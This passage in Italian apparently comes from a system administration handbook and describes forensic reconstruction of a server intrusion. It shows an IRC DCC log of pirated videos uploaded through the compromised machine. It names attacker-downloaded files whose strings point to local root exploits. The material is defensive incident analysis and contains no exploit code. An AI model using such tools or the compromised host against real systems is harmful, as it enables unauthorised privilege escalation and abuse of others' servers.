<programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)</programlisting>
			 <para>
				Queste informazioni tracciate mostrano che sul server sono stati salvati due file video attraverso l'indirizzo IP 82.50.72.202.
			</para>
			 <para>
				In parallelo, l'autore dell'attacco ha inoltre scaricato un paio di file aggiuntivi, <filename>/tmp/pt</filename> e <filename>/tmp/loginx</filename>. Passando questi file in <command>strings</command> si ottengono stringhe tipo <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> e <foreignphrase>Now wait for suid shell...</foreignphrase>. Questi sembrano programmi che sfruttano vulnerabilità locali per ottenere i privilegi di amministratore. Hanno raggiunto il loro scopo? In questo caso, probabilmente no, dato che nessun file sembra essere stato modificato dopo l'intrusione iniziale.
			</para>
			 <para>
				In questo esempio, è stata ricostruita l'intera intrusione, e si può dedurre che l'autore dell'attacco è riuscito a sfruttare il sistema compromesso per circa tre giorni; ma l'elemento più importante nell'analisi è che la vulnerabilità è stata identificata, e l'amministratore può stare tranquillo che la nuova installazione ripara realmente la vulnerabilità.
			</para>

		</section>

	</section>
</chapter>

